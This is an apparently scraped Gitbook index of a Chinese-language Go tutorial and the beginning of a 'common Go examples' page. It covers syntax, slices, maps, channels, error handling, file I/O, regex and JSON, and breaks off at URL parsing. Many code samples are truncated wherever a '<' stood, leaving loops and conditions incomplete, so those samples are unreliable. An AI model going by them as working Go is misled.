fmt.Printf(\"integer %d\\n\", t) // t 是 int 类型 case *bool: fmt.Printf(\"pointer to boolean %t\\n\", *t) // t 是 *bool 类型 case *int: fmt.Printf(\"pointer to integer %d\\n\", *t) // t 是 *int 类型 } 通用格式 package main import ( \"fmt\" ) type structTest struct { name string age int } func main() { a := structTest{ name: \"d4m1ts\", age: 18, } fmt.Printf(\"123 %v 456\\n\", \"aa\") // 123 aa 456 fmt.Printf(\"123 %v 456\\n\", a) // 123 {d4m1ts 18} 456 fmt.Printf(\"123 %+v 456\\n\", a) // 123 {name:d4m1ts age:18} 456 fmt.Printf(\"123 %#v 456\\n\", a) // 123 main.structTest{name:\"d4m1ts\", age:18} 456 } // 通用的格式 %v（对应“值”），这种格式还能打印任意值，甚至包括数组、结构体和映射。 // 当打印结构体时，改进的格式 %+v 会为结构体的每个字段添上字段名，而另一种格式 %#v 将完全按照Go的语法打印值。 条件语句 注意大括号{的位置，不能单独一行！！！ if package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 5){ fmt.Println(name) } } if...else package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 10){ fmt.Println(name) } else { fmt.Println(\"NONONO\") } } if...else if...else package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 10){ fmt.Println(name) } else if (len(name) == 6) { fmt.Println(name, \"==6\") } else { fmt.Println(\"NONONO\") } } switch package main import \"fmt\" func main() { name := \"d4m1ts\" switch { case len(name) > 5: fmt.Print(\">5\") case len(name) select select 是 Go 中的一个控制结构，类似于用于通信的 switch 语句。每个 case 必须是一个通信操作，要么是发送要么是接收。 select 随机执行一个可运行的 case。如果没有 case 可运行，它将阻塞，直到有 case 可运行。一个默认的子句应该总是可运行的。 语法: Go 编程语言中 select 语句的语法如下： select { case communication clause : statement(s); case communication clause : statement(s); /* 你可以定义任意数量的 case */ default : /* 可选 */ statement(s); } 以下描述了 select 语句的语法： 每个 case 都必须是一个通信 所有 channel 表达式都会被求值 所有被发送的表达式都会被求值 如果任意某个通信可以进行，它就执行，其他被忽略。 如果有多个 case 都可以运行，Select 会随机公平地选出一个执行。其他不会执行。 否则： 如果有 default 子句，则执行该语句。 如果没有 default 子句，select 将阻塞，直到某个通信可以运行；Go 不会重新对 channel 或值进行求值。 实例： package main import \"fmt\" func main() { var c1, c2, c3 chan int var i1, i2 int select { case i1 = 循环语句 for 语法： 共有3种语法，分别是 // 1.和 C 语言的 for 一样 for init; condition; post { } // 2.和 C 的 while 一样 for condition { } // 3.while true，需要手动break for { } init： 一般为赋值表达式，给控制变量赋初值； condition： 关系表达式或逻辑表达式，循环控制条件； post： 一般为赋值表达式，给控制变量增量或减量。 实例： package main import \"fmt\" func main() { sum := 0 // 1 ==> 10 for i:=0; i 40 for sum 160 for { sum += sum if sum > 100{ break } } fmt.Println(sum) } for each 严格来说是 for each range 循环 package main import \"fmt\" func main() { ab := []string {\"aaa\", \"bbb\"} for i,s := range ab{ fmt.Println(i ,s) } } /* 0 aaa 1 bbb */ 无限循环 package main import \"fmt\" func main() { for true { fmt.Println(\"1\") } } 循环控制 就是让循环停止或者跳过此次循环 break 经常用于中断当前 for 循环或跳出 switch 语句 continue 跳过当前循环的剩余语句，然后继续进行下一轮循环。 goto 将控制转移到被标记的语句。 goto见比较少，举个例子吧 package main import \"fmt\" func main() { a := 10 LOOP: for a init函数 每个源文件都可以通过定义自己的无参数 init 函数来设置一些必要的状态。（其实每个文件都可以拥有多个 init 函数。）而它的结束就意味着初始化结束：只有该包中的所有变量声明都通过它们的初始化器求值后 init 才会被调用， 而那些init 只有在所有已导入的包都被初始化后才会被求值。 除了那些不能被表示成声明的初始化外，init 函数还常被用在程序真正开始执行前，检验或校正程序的状态。 package main import \"fmt\" func init() { fmt.Println(\"init ...\") } func main() { fmt.Println(\"main ...\") } /* init ... main ... */ 自定义函数 语法： func function_name( [parameter list] ) [return_types] { 函数体 } 函数定义解析： func：函数由 func 开始声明 function_name：函数名称，参数列表和返回值类型构成了函数签名。 parameter list：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。 return_types：返回类型，函数返回一列值。return_types 是该列值的数据类型。有些功能不需要返回值，这种情况下 return_types 不是必须的。 函数体：函数定义的代码集合。 实例： 选出2个数中最大的 package main import \"fmt\" func main() { fmt.Println(max(5,9 )) } func max (a int, b int) int { if a > b { return a } else { return b } } 返回多个值 package main import \"fmt\" func main() { fmt.Println(max(5,9 )) } func max (a int, b int) (int,int) { if a > b { return a,b } else { return b,a } } 引用传递值 传入的是地址，函数内值被修改，函数外也会受影响 package main import \"fmt\" func main() { a := 66 test(&a) fmt.Println(a) } func test(a *int) { fmt.Println(*a) *a += 10 fmt.Println(*a) } /* 66 76 76 */ 构造函数与复合字面 有时零值还不够好，这时就需要一个初始化构造函数，如来自 os 包中的这段代码所示。 func NewFile(fd int, name string) *File { if fd 这里显得代码过于冗长。我们可通过复合字面来简化它， 该表达式在每次求值时都会创建新的实例 func NewFile(fd int, name string) *File { if fd 作用域 局部变量 在函数体内声明的变量称之为局部变量，它们的作用域只在函数体内，参数和返回值变量也是局部变量。 全局变量 在函数体外声明的变量称之为全局变量，全局变量可以在整个包甚至外部包（被导出后）使用； 全局变量可以在任何函数中使用 全局变量与局部变量名称可以相同，但是函数内的局部变量会被优先考虑 实例： package main import \"fmt\" var global string = \"全局变量\" func main() { fmt.Println(global) } 数组 初始化数组 如果数组长度不确定，可以使用 ... 代替数组的长度，编译器会根据元素个数自行推断数组的长度（也可以使用切片） 初始化数组中 {} 中的元素个数不能大于 [] 中的数字 语法： var variable_name [SIZE] variable_type var balance [10] float32 实例： package main import \"fmt\" func main() { var a [10] string var b = [...] int {1,2,3,4,5} c := [] string {\"aa\", \"bb\", \"cc\"} // 切片 fmt.Println(a) fmt.Println(b) fmt.Println(c) } 访问数组 数组元素可以通过索引（位置）来读取。格式为数组名后加中括号，中括号中为索引的值。 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} fmt.Println(c[0]) for i,s := range c { fmt.Println(i, s) } } 指针 使用指针 会C的指针，这个就很简单了 取地址符是&，放到一个变量前使用就会返回相应变量的内存地址 取值符是*，放到一个内存地址前使用就会返回相应变量的值 package main import \"fmt\" func main() { a := 1 // 实际变量 var ip *int // 指针变量 ip = &a fmt.Println(\"a的值：\", a) fmt.Println(\"a的地址：\", &a) fmt.Printf(\"a的地址：%x\", ip) } 空指针 当一个指针被定义后没有分配到任何变量时，它的值为 nil。 nil 指针也称为空指针。 nil在概念上和其它语言的null、None、nil、NULL一样，都指代零值或空值。 一个指针变量通常缩写为 ptr package main import \"fmt\" func main() { var ptr *int // 指针变量 fmt.Printf(\"ptr空指针地址：%x\", ptr) } // 0 判断空指针 if(ptr != nil) /* ptr 不是空指针 */ if(ptr == nil) /* ptr 是空指针 */ 指针数组 有一种情况，我们可能需要保存数组，这样我们就需要使用到指针 package main import \"fmt\" func main() { var a = [] int {1,2,3} var ptr [3] *int for i,s := range a { ptr[i] = &s } fmt.Println(ptr) // [0xc000198000 0xc000198000 0xc000198000] for i,s := range ptr { fmt.Println(i, *s) } } ptr 为整型指针数组，因此每个元素都指向了数组中第一个值的地址 结构体 定义结构体 结构体定义需要使用 type 和 struct 语句。struct 语句定义一个新的数据类型，结构体中有一个或多个成员。type 语句设定了结构体的名称。结构体的格式如下： type struct_variable_type struct { member definition member definition ... member definition } 一旦定义了结构体类型，它就能用于变量的声明，语法格式如下： variable_name := structure_variable_type {value1, value2...valuen} // 或 variable_name := structure_variable_type { key1: value1, key2: value2..., keyn: valuen} 实例： package main import \"fmt\" func main() { type testStruct struct { name string age int } a := testStruct{\"d4m1\", 18} fmt.Println(a) b := testStruct{name: \"d4m1ts\", age: 18} fmt.Println(b) } /* {d4m1 18} {d4m1ts 18} */ 访问成员 如果要访问结构体成员，需要使用点号.操作符，格式为： 结构体.成员名 实例： package main import \"fmt\" func main() { type testStruct struct { name string age int } a := testStruct{name: \"d4m1ts\", age: 18} fmt.Println(a.name) } // d4m1ts 结构体作为参数 和其他类型一样，只不过类型是结构体罢了 实例： package main import \"fmt\" type testStruct struct { name string age int } func main() { a := testStruct{name: \"d4m1ts\", age: 18} printName(a) } func printName(stru testStruct) { fmt.Println(stru.name) } 结构体指针 也和其他指针一样 实例： package main import \"fmt\" type testStruct struct { name string age int } func main() { a := testStruct{name: \"d4m1ts\", age: 18} fmt.Println(&a) printName(&a) } func printName(stru *testStruct) { fmt.Println(stru.name) } /* &{d4m1ts 18} d4m1ts */ 切片 Go 语言切片是对数组的抽象。 Go 数组的长度不可改变，在特定场景中这样的集合就不太适用，Go 中提供了一种灵活，功能强悍的内置类型切片(\"动态数组\")，与数组相比切片的长度是不固定的，可以追加元素，在追加时可能使切片的容量增大。 定义切片 可以声明一个未指定大小的数组来定义切片，切片不需要说明长度 var identifier []type 或使用 make() 函数来创建切片: var slice1 []type = make([]type, len) // 也可以简写为 slice1 := make([]type, len) 也可以指定容量，其中 capacity 为可选参数。 make([]T, length, capacity) 这里 len 是数组的长度并且也是切片的初始长度。 实例： package main import \"fmt\" func main() { var slice1 []int fmt.Println(slice1) // [] var slice2 []int = make([]int, 10) fmt.Println(slice2) // [0 0 0 0 0 0 0 0 0 0] } 初始化切片 package main import \"fmt\" func main() { s1 := []int {1,2,3,4,5} fmt.Println(s1) // [1 2 3 4 5] // 使用数组来初始化切片 d1 := [10]int {1,3,5,7,9} fmt.Println(d1) // [1 3 5 7 9 0 0 0 0 0] s2 := d1[:] fmt.Println(s2) // [1 3 5 7 9 0 0 0 0 0] s3 := d1[2:] fmt.Println(s3) // [5 7 9 0 0 0 0 0] } 空(nil)切片 一个切片在未初始化之前默认为 nil，长度为 0 package main import \"fmt\" func main() { var s1 []int fmt.Println(s1) // [] fmt.Println(s1 == nil) // true } 切片截取 和python一样，array[start:end]截取即可 package main import \"fmt\" func main() { var s1 = []int {1,2,3,4,5} fmt.Println(s1[2:4]) // [3 4] } len()和cap()函数 切片是可索引的，并且可以由len()方法获取长度。 切片提供了计算容量的方法cap()可以测量切片最长可以达到多少。 package main import \"fmt\" func main() { s1 := []int {1,2,3,4,5} fmt.Println(len(s1)) // 5 fmt.Println(cap(s1)) // 5 } 追加元素 通过append函数可以追加元素 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} c = append(c, \"dd\", \"ee\") fmt.Println(c) // [aa bb cc dd ee] } 如果想合并2个切片，也可以使用append 注意的是要添加...，如果没有 ...，它就会由于类型错误而无法编译 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} c = append(c, \"dd\", \"ee\") x := [] string {\"1\",\"2\",\"3\"} c = append(c, x...) fmt.Println(c) // [aa bb cc dd ee 1 2 3] } append()和copy()函数 如果想增加切片的容量，我们必须创建一个新的更大的切片并把原分片的内容都拷贝过来。 下面的代码描述了从拷贝切片的 copy 方法和向切片追加新元素的 append 方法。 package main import \"fmt\" func main() { var s1 = []int {1,2,3,4,5} s1 = append(s1, 666) // [1 2 3 4 5 666] s1 = append(s1, 7,8,9) // [1 2 3 4 5 666 7 8 9] fmt.Println(s1) s2 := make([]int, len(s1)*2, cap(s1)*2) copy(s2, s1) // 把s1的内容复制给s2 fmt.Println(s2) // [1 2 3 4 5 666 7 8 9 0 0 0 0 0 0 0 0 0] } 集合(Map) Map 是一种无序的键值对的集合。Map 最重要的一点是通过 key 来快速检索数据，key 类似于索引，指向数据的值。 Map 是一种集合，所以我们可以像迭代数组和切片那样迭代它。不过，Map 是无序的，我们无法决定它的返回顺序，这是因为 Map 是使用 hash 表来实现的。 定义Map 可以使用内建函数 make 也可以使用 map 关键字来定义 Map: /* 声明变量，默认 map 是 nil */ var map_variable map[key_data_type]value_data_type /* 使用 make 函数 */ map_variable := make(map[key_data_type]value_data_type) 实例： package main import \"fmt\" func main() { // 1.直接使用map创建 m1 := map[string]string{ \"a\": \"test1\", \"b\": \"test2\", } m1 [\"c\"] = \"test3\" fmt.Println(m1) // 2.使用make创建 m2 := make(map[string]string) m2 [\"e\"] = \"f\" fmt.Println(m2) } 删除元素 delete()函数用于删除集合的元素, 参数为map和其对应的key package main import \"fmt\" func main() { // 1.直接使用map创建 m1 := map[string]string{ \"a\": \"test1\", \"b\": \"test2\", } m1 [\"c\"] = \"test3\" delete(m1, \"a\") fmt.Println(m1) // map[b:test2 c:test3] } 范围(Range) range 关键字用于 for 循环中迭代数组(array)、切片(slice)、通道(channel)或集合(map)的元素。在数组和切片中它返回元素的索引和索引对应的值，在集合中返回 key-value 对 package main import \"fmt\" func main() { // 遍历切片 var s1 = []int {1,2,3,4,5} sum := 0 for _,num := range s1 { // _空白符，表示被舍弃的变量，这里的变量是索引 sum += num } fmt.Println(sum) // 遍历map m1 := map[string]string{ \"a\":\"test1\", \"b\":\"test2\", } for k,v := range m1 { fmt.Println(k, v) } } 类型转换 类型转换用于将一种数据类型的变量转换为另外一种类型的变量 语法： type_name为类型，expression为表达式 type_name(expression) 实例： package main import \"fmt\" func main() { a := 1 fmt.Println(string(a)) // 空 fmt.Println(float32(a)) // 1 } 递归 递归，就是在运行的过程中调用自己 阶乘实例 package main import \"fmt\" func Factorial(n uint64)(result uint64) { if (n > 0) { result = n * Factorial(n-1) return result } return 1 } func main() { var i int = 15 fmt.Printf(\"%d 的阶乘是 %d\\n\", i, Factorial(uint64(i))) } // 15 的阶乘是 1307674368000 斐波那契数列实例 package main import \"fmt\" func fibonacci(n int) int { if n 接口 Go 语言提供了另外一种数据类型即接口，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口 和其他语言如java的接口一样 声明接口 type interface_name interface { method_name1([args ...arg_type]) [return_type] method_name2([args ...arg_type]) [return_type] method_name3([args ...arg_type]) [return_type] ... method_namen([args ...arg_type]) [return_type] } 一个接口中可以定义多个方法，根据逻辑需要，自定义参数和返回值。 实现接口 一个结构体实现了某个接口的所有方法，则此结构体就实现了该接口。 实例： package main import \"fmt\" // 定义接口 type testImpl interface { testFunc1(a int, b int) } // 定义结构体 type testStruct struct { } // 实现函数 func (testMethod testStruct) TestFunc1(a int, b int) int { return a+b } // 调用函数 func main() { test := testStruct{} // 实例化方法1 res := test.TestFunc1(10,20) fmt.Println(res) test1 := new(testStruct) // 实例化方法2 res1 := test1.TestFunc1(10,20) fmt.Println(res1) } new和make Go提供了两种分配原语，即内建函数 new 和 make。 它们所做的事情不同，所应用的类型也不同。它们可能会引起混淆，但规则却很简单。 new 这是个用来分配内存的内建函数，但与其它语言中的同名函数不同，它不会初始化内存，只会将内存置零。也就是说，new(T) 会为类型为 T 的新项分配已置零的内存空间，并返回它的地址，也就是一个类型为 *T 的值。 它返回一个指针，该指针指向新分配的，类型为T的零值 实例： package main import ( \"fmt\" ) func main() { type test struct { a int b int } p := new(test) fmt.Println(p) // &{0 0} fmt.Println(*p) // {0 0} } make 内建函数 make(T, args) 的目的不同于 new(T)，它只用于创建切片、映射和信道，并返回类型为 T（而非 *T）的一个已初始化（而非置零）的值。 注意：make只适用于映射、切片和信道且不返回指针。若要获得明确的指针，请使用new分配内存。 defer defer 语句用于预设一个函数调用（即推迟执行函数）， 该函数会在执行 defer 的函数返回之前立即执行。它显得非比寻常， 但却是处理一些事情的有效方式，例如无论以何种路径返回，都必须释放资源的函数。 典型的例子就是解锁互斥和关闭文件。 被推迟函数的实参（如果该函数为方法则还包括接收者）在推迟执行时就会求值， 而不是在调用执行时才求值。这样不仅无需担心变量值在函数执行时被改变， 同时还意味着单个已推迟的调用可推迟多个函数的执行。 实例： 被推迟的函数按照后进先出（LIFO）的顺序执行，因此以上代码在函数返回时会打印 4 3 2 1 0 package main import ( \"fmt\" ) func main() { for i := 0; i 并发 go程 称之为Go程是因为现有的术语—线程、协程、进程等等—无法准确传达它的含义。 Go程具有简单的模型：它是与其它Go程并发运行在同一地址空间的函数。它是轻量级的，所有消耗几乎就只有栈空间的分配；而且栈最开始是非常小的，所以它们很廉价，仅在需要时才会随着堆空间的分配（和释放）而变化。 Go语言支持并发，我们只需要通过 go 关键字来开启 goroutine 即可。 goroutine 是轻量级线程，goroutine 的调度是由 Golang 运行时进行管理的。 语法： go 函数名( 参数列表 ) Go 允许使用 go 语句开启一个新的运行期线程， 即 goroutine，以一个不同的、新创建的 goroutine 来执行一个函数。 同一个程序中的所有 goroutine 共享同一个地址空间 实例： package main import ( \"fmt\" \"time\" ) func loop() { i := 1 for i 执行代码后，输出结果为1 1 1 2 2 2 3 3 3 ...，因为是3个goroutine在同时执行 通道（channel） 通道（channel，也叫信道）是用来传递数据的一个数据结构。 主要是获取并发的每个函数返回的数据 通道可用于两个 goroutine 之间通过传递一个指定类型的值来同步运行和通讯。操作符 用于指定通道的方向，发送或接收。如果未指定方向，则为双向通道。 ch 声明一个通使用chan关键字即可，通道在使用前必须先创建： ch := make(chan int) 实例： package main import \"fmt\" // 计算和 func loop(res chan int) { i := 1 sum := 0 for i 通道缓冲区 通道可以设置缓冲区，通过 make 的第二个参数指定缓冲区大小 ch := make(chan int, 100) 带缓冲区的通道允许发送端的数据发送和接收端的数据获取处于异步状态，就是说发送端发送的数据可以放在缓冲区里面，可以等待接收端去获取数据，而不是立刻需要接收端去获取数据。 不过由于缓冲区的大小是有限的，所以还是必须有接收端来接收数据的，否则缓冲区一满，数据发送端就无法再发送数据了。 注意：如果通道不带缓冲，发送方会阻塞直到接收方从通道中接收了值。如果通道带缓冲，发送方则会阻塞直到发送的值被拷贝到缓冲区内；如果缓冲区已满，则意味着需要等待直到某个接收方获取到一个值。接收方在有值可以接收之前会一直阻塞。 实例： package main import \"fmt\" // 计算所有通道的和 func loop(res chan int) { i := 1 for i 注意事项 接收者在收到数据前会一直阻塞。若信道是不带缓冲的，那么在接收者收到值前，发送者会一直阻塞；若信道是带缓冲的，则发送者仅在值被复制到缓冲区前阻塞；若缓冲区已满，发送者会一直等待直到某个接收者取出一个值为止。 遍历通道 通过 range 关键字来实现遍历读取到的数据，类似于与数组或切片 实例： package main import \"fmt\" func loop(res chan int) { i := 1 for i 关闭通道 如果通道接收不到数据后 ok 就为 false，这时通道就可以使用 close() 函数来关闭 package main import \"fmt\" func loop(res chan int) { i := 1 for i 异常处理 在异常处理方面，Go语言不像其他语言，使用try..catch.. finall...， 而使用defer, panic, recover，将异常和控制流程区分开。即通过panic抛出异常，然后在defer中，通过recover捕获这个异常，最后处理。 但是更加推荐的错误处理方法： Golang中我们通常会在函数或方法中返回error结构对象来判断是否有异常出现，并且可以更具需要自定义各种类型的error。如果返回的 error 值为 nil，则表示未遇到错误，否则 error 会返回一个字符串，用于说明遇到了什么错误。 error类型是一个接口类型，自定义的错误类型必须实现Error()方法，这是它的定义： type error interface { Error() string } 生成error 1、原生New方法，将字符串 text 包装成一个 error 对象返回 func New(text string) error { return &errorString{text} } //例如 errorIns := errors.New(\"test content\") fmt.Println(errorIns) 2、定义自己的错误 package main import ( \"fmt\" \"time\" ) // 定义结构体 type MyError struct { When time.Time What string } // 实现error接口中的方法 func (e MyError) Error() string { return fmt.Sprintf(\"%v: %v\", e.When, e.What) } // 编写异常函数 func oops() error { return MyError{ time.Date(1989, 3, 15, 22, 30, 0, 0, time.UTC), \"the file system has gone away\", } } func main() { if err := oops(); err != nil { fmt.Println(err) } } Panic异常 向调用者报告错误的一般方式就是将 error 作为额外的值返回；但是这种情况下程序不会退出，如果我们遇到了出现异常就必须停止程序的情况，就会使用到panic Go提供了内建的 panic 函数 它会产生一个运行时错误并终止程序 该函数接受一个任意类型的实参（一般为字符串），并在程序终止时打印 它还能表明发生了意料之外的事情，比如从无限循环中退出了 package main import \"fmt\" func main() { panic(\"sth error !!!\") fmt.Println(\"hello world\") } /* panic: sth error !!! goroutine 1 [running]: main.main() /Users/d4m1ts/go/src/goTest/Hello.go:6 +0x39 */ 因为会直接停止整个程序，所以实际的库函数应避免 panic，若问题可以被屏蔽或解决， 最好就是让程序继续运行而不是终止整个程序 恢复 当 panic 被调用后（包括不明确的运行时错误，例如切片检索越界或类型断言失败）， 程序将立刻终止当前函数的执行，并开始回溯Go程的栈，运行任何被推迟（defer）的函数。 若回溯到达Go程栈的顶端，程序就会终止。不过我们可以用内建的 recover 函数来重新或来取回Go程的控制权限并使其恢复正常执行。 实例： package main import ( \"fmt\" \"time\" ) func loop(a int){ defer func() { // 触发panic异常就会调用这个推迟函数 if err := recover(); err != nil { // recover函数恢复 fmt.Println(\"loop error: \", err) } }() if a > 3{ panic(\"erro a > 3\") } else { fmt.Println(\"normal: \", a) } } func main() { i := 0 for i 3 normal: 3 */ 通过恰当地使用恢复模式，do 函数（及其调用的任何代码）可通过调用 panic 来避免更坏的结果。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-29 17:16:52 "},"个人知识库/03.编程开发/GO/02.GO常用实例.html":{"url":"个人知识库/03.编程开发/GO/02.GO常用实例.html","title":"02.GO常用实例","keywords":"","body":" 介绍 读文件 按字节读取文件 借助ioutil来读取 仅使用ioutil包来完成读取操作 利用Scanner按行读取 写文件 使用ioutil 通过File句柄 通过bufio包 正则表达式 匹配内容是否存在 提取内容 替换内容 其他 JSON序列化和反序列化 标准JSON模块 更优的jsoniter 时间日期 随机数 伪随机数 真随机数 URL解析 Base64 命令行参数 执行系统命令 只执行命令，不获取结果 执行命令获取结果 执行命令获取结果并区分stdout和stderr 多条命令使用管道执行 HTTP请求 快速发起get请求 带有参数的GET请求 返回JSON的数据包 自定义Header头 快速发起POST请求 自定义POST请求 忽略证书 参考 介绍 记录一些可能常用到的实例，便于快速查询 读文件 按字节读取文件 这种方式是以字节为单位来读取，相对底层一些，代码量也较大 package main import ( \"fmt\" \"io\" \"os\" ) func main() { file,_ := os.Open(\"test.txt\") defer file.Close() buf := make([]byte, 1024) // 每次读取1024字节 var res string // 存放最终的结果 for { count, err := file.Read(buf) if err == io.EOF { // 检测是否到结尾 break } else { currBytes := buf[:count] // 读取了count字节 res += string(currBytes) // 最终结果 } } fmt.Println(res) } 借助ioutil来读取 由于 os.File 也是 io.Reader 的实现，我们可以调用 ioutil.ReadAll(io.Reader) 方法，将文件所有字节读取出来，省去了使用字节缓存循环读取的过程。 package main import ( \"fmt\" \"io/ioutil\" \"os\" ) func main() { file,_ := os.Open(\"test.txt\") defer file.Close() byteRes, _ := ioutil.ReadAll(file) // 返回存放结果的切片 fmt.Printf(\"%T\\n\", byteRes) // []uint8 fmt.Println(string(byteRes)) } 仅使用ioutil包来完成读取操作 为了进一步简化文件读取操作，ioutil 还提供了 ioutil.ReadFile(filename string) 方法，一行代码搞定读取任务 package main import ( \"fmt\" \"io/ioutil\" ) func main() { data, _ := ioutil.ReadFile(\"test.txt\") fmt.Println(string(data)) } 利用Scanner按行读取 逐行读取文件内容，这个时候可以 Scanner 来完成 package main import ( \"bufio\" \"fmt\" \"os\" ) func main() { file, _ := os.Open(\"test.txt\") defer file.Close() scanner := bufio.NewScanner(file) // 类似Java中的Scanner for scanner.Scan() { fmt.Println(scanner.Text()) } } 写文件 使用ioutil 刚才用到了ioutil.ReadFile，与之对应的，肯定也有WriteFile 该函数属于全覆盖写入，如果文件不存在，则会根据指定的权限创建文件，如果存在，则会先清空文件原有内容，然后再写入新数据 package main import ( \"fmt\" \"io/ioutil\" \"os\" ) func main() { data := []byte(\"hello d4m1ts\") fmt.Println(os.FileMode(0666).String()) // -rw-rw-rw- ioutil.WriteFile(\"test.txt\", data, 0666) } 通过File句柄 os.OpenFile(name string, flag int, perm FileMode)方法，通过指定额外的 读写方式 和 文件权限 参数，使文件操作变得更为灵活。 flag 有以下几种常用的值： os.O_CREATE: create if none exists 不存在则创建 os.O_RDONLY: read-only 只读 os.O_WRONLY: write-only 只写 os.O_RDWR: read-write 可读可写 os.O_TRUNC: truncate when opened 文件长度截为0：即清空文件 os.O_APPEND: append 追加新数据到文件 package main import ( \"fmt\" \"os\" ) func main() { file,_ := os.OpenFile(\"test.txt\", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0666) // 按照特定权限打开 defer file.Close() data := []byte(\"hello d4m1ts\") count, _ := file.Write(data) // 按字节写入，返回的count为写入的字节数 fmt.Println(count) count, _ = file.WriteString(\"\\nHello D4m1ts\") // 按字符串写入 fmt.Println(count) file.Sync() // 确保写入到磁盘 } 通过bufio包 这种方式其实是在File句柄上做了一层封装，调用方式和上面直接写入非常相似 package main import ( \"bufio\" \"fmt\" \"os\" ) func main() { file,_ := os.OpenFile(\"test.txt\", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0666) defer file.Close() writer := bufio.NewWriter(file) data := []byte(\"hello d4m1ts\") count, _ := writer.Write(data) // 按字节写入，返回的count为写入的字节数 fmt.Println(count) count, _ = writer.WriteString(\"\\nHello D4m1ts\") // 按字符串写入 fmt.Println(count) writer.Flush() // 清空缓存，确保写入到磁盘 } 正则表达式 匹配内容是否存在 package main import ( \"fmt\" \"regexp\" ) func main() { regex := \"\\\\d{1,3}\" res, _ := regexp.MatchString(regex, \"123123\") res1, _ := regexp.MatchString(regex, \"aaaa\") fmt.Println(res) // true fmt.Println(res1) // false } 提取内容 package main import ( \"fmt\" \"regexp\" ) func main() { regex, _ := regexp.Compile(\"(\\\\d{1,3})\\\\d{1,3}\") // 编译正则表达式 fmt.Println(regex.MatchString(\"123123123123\")) // true fmt.Println(regex.FindString(\"123213123123\")) // 123213 返回第一个匹配的 fmt.Println(regex.FindStringIndex(\"123213123123\")) // [0 6] 返回第一个匹配的开始和结尾的索引 fmt.Println(regex.FindStringSubmatch(\"123213123123\")) // [123213 123] 返回包括()这种子匹配的 fmt.Println(regex.FindAllString(\"123213123123\",-1)) // [123213 123123] 返回匹配的所有内容，n表示为返回个数，-1则返回全部 fmt.Println(regex.FindAllStringSubmatch(\"123213123123\",-1)) // [[123213 123] [123123 123]] 同时返回子匹配的结果 fmt.Println(regex.FindAll([]byte(\"123123123123\"), -1)) // [[49 50 51 49 50 51] [49 50 51 49 50 51]] 通过字节去匹配，返回的也是字节的结果 } 替换内容 package main import ( \"fmt\" \"regexp\" ) func main() { regex, _ := regexp.Compile(\"(\\\\d{1,3})\\\\d{1,3}\") // 编译正则表达式 fmt.Println(regex.ReplaceAllString(\"123123123213\",\"a\")) // aa } 其他 在线正则表达式测试网站：https://regex101.com/ golang正则匹配的时候，.默认是不匹配换行的，所以要匹配多行数据就容易出问题 这个时候可以采用如下格式，让.也可以匹配换行 (?s).* 实例： JSON序列化和反序列化 标准JSON模块 Go 语言标准库 encoding/json 提供了操作 JSON 的方法，一般可以使用 json.Marshal 和 json.Unmarshal 来序列化和解析 JSON 字符串 实例一： package main import ( \"encoding/json\" \"fmt\" ) func main() { // 序列化 s1 := []string{\"apple\", \"peach\", \"pear\"} s2, _ := json.Marshal(s1) // 转字符串 fmt.Println(string(s2)) // [\"apple\",\"peach\",\"pear\"] // 反序列化 var s3 [] string json.Unmarshal([]byte(s2), &s3) // 字符串恢复 fmt.Println(s3) // [apple peach pear] fmt.Println(len(s3), s3[0]) // 3 apple } 实例二： package main import ( \"encoding/json\" \"fmt\" ) // 定义结构体，变量名注意大写，因为跨到json包了 type User struct { Name string Age int } func main() { // 初始化结构体 user := User{ Name: \"d4m1ts\", Age: 18, } // 序列化，转字符串 s1, _ := json.Marshal(user) fmt.Println(string(s1)) // 反序列化，恢复为原来的结构 user2 := User{} json.Unmarshal(s1, &user2) fmt.Println(user2) } 更优的jsoniter 标准库 encoding/json 在使用时需要预先定义结构体，使用时显得不够灵活。这时候可以尝试使用 github.com/json-iterator/go 模块，其除了提供与标准库一样的接口之外，还提供了一系列更加灵活的操作方法。 go get -v github.com/json-iterator/go package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" ) func main() { // 反序列化，恢复为原来的结构 s := `{\"a\":\"b\", \"c\":[\"d\",\"e\",\"f\"]}` res := jsoniter.Get([]byte(s), \"c\") fmt.Println(res.ToString()) // [\"d\",\"e\",\"f\"] 只解析\"c\"的内容部分 } 时间日期 package main import ( \"fmt\" \"time\" ) func main() { p := fmt.Println // 现在的时间 now := time.Now() p(now) // 休眠1秒 time.Sleep(time.Second * 1) p(time.Now()) // 现在的时间 // 格式类型转换 t1, _ := time.Parse(time.RFC3339, \"2012-11-01T22:08:41+00:00\") p(t1) // 2012-11-01 22:08:41 +0000 +0000 // 格式化输出 p(now.Format(\"3:04PM\")) // 5:14PM p(now.Format(\"Mon Jan _2 15:04:05 2006\")) // Tue Dec 28 17:15:49 2021 p(now.Format(\"2006-01-02T15:04:05.999999-07:00\")) // 2021-12-28T17:15:49.121777+08:00 p(now.Format(time.RFC850)) // Tuesday, 28-Dec-21 17:20:02 CST fmt.Printf(\"%d-%02d-%02dT%02d:%02d:%02d-00:00\\n\", now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second()) // 2021-12-28T17:20:02-00:00 } 随机数 伪随机数 Go的math/rand包提供伪随机数生成。例如，rand.Intn返回一个随机int n，0 。 伪随机生成的数字是确定的，不论在什么机器、什么时间，只要执行的随机代码一样，那么生成的随机数就一样 package main import ( \"fmt\" \"math/rand\" ) func main() { p := fmt.Println p(rand.Int()) // 5577006791947779410 p(rand.Int31n(int32(60))) // 27 for i:=0; i 真随机数 crypto/rand是为了提供更好的随机性满足密码对随机数的要求，在linux上已经有一个实现就是/dev/urandom，crypto/rand就是从这个地方读“真随机”数字返回，但性能比较慢 package main import ( \"crypto/rand\" \"math/big\" ) func main() { for i := 0; i URL解析 可以直接使用url.Parse(string u)来解析，其中包括方案，身份验证信息，主机，端口，路径，查询参数和查询片段等信息 package main 